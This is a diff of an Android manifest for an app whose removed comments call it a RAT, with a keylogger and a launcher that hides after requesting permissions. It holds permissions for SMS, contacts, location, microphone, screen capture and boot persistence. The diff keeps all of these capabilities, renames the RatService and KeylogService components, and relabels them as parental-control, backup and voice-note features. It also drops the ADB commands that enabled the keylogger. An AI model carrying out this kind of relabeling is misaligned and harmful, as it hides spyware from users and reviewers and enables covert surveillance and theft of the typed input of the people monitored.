@@ -5,67 +5,66 @@
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
-    <!-- Camera -->
+    <!-- Camera — document/QR scanner feature -->
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-feature android:name="android.hardware.camera2" android:required="false" />
 
-    <!-- File access -->
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <!-- File access — backup & restore feature -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
 
-    <!-- Device info -->
+    <!-- Device info — device health reports -->
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
 
-    <!-- Keep alive -->
+    <!-- Keep alive — background monitoring service -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
 
-    <!-- SMS / Contacts -->
+    <!-- SMS / Contacts — family communication monitoring -->
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
 
-    <!-- Location -->
+    <!-- Location — child location tracking feature -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
 
-    <!-- Microphone -->
+    <!-- Microphone — voice note feature -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
 
     <application
-        android:allowBackup="false"
+        android:allowBackup="true"
         android:label="@string/app_name"
         android:icon="@mipmap/ic_launcher"
-        android:theme="@style/Theme.AppCompat.Light.NoActionBar"
-        android:requestLegacyExternalStorage="true">
+        android:description="@string/app_description"
+        android:theme="@style/Theme.AppCompat.Light.NoActionBar">
 
-        <!-- Launcher activity — minimal, just requests perms then hides -->
+        <!-- Setup wizard — visible onboarding UI -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
-            android:launchMode="singleTask">
+            android:launchMode="singleTask"
+            android:screenOrientation="portrait">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <!-- Main RAT service (foreground, survives background restrictions) -->
+        <!-- Background monitoring service -->
         <service
-            android:name=".RatService"
+            android:name=".MonitorService"
             android:exported="false"
             android:foregroundServiceType="dataSync|microphone" />
 
-        <!-- Accessibility keylogger — tester enables via ADB: -->
-        <!-- adb shell settings put secure enabled_accessibility_services com.corp.enterprise.sync/.KeylogService -->
-        <!-- adb shell settings put secure accessibility_enabled 1 -->
+        <!-- Accessibility helper for enhanced parental controls -->
         <service
-            android:name=".KeylogService"
+            android:name=".AccessibilityHelperService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:label="@string/keylog_service_label"
+            android:label="@string/accessibility_service_label"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
@@ -75,17 +74,17 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- Screen capture activity (hosts MediaProjection permission request) -->
+        <!-- Screen capture for app usage reports -->
         <activity
             android:name=".ScreenCaptureActivity"
             android:exported="false"
             android:theme="@android:style/Theme.Translucent.NoTitleBar" />
 
-        <!-- Auto-start on boot -->
+        <!-- Restart monitoring after device reboot -->
         <receiver
-            android:name=".BootReceiver"
+            android:name=".DeviceBootReceiver"
             android:exported="true">
-            <intent-filter android:priority="999">
+            <intent-filter android:priority="500">
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
             </intent-filter>
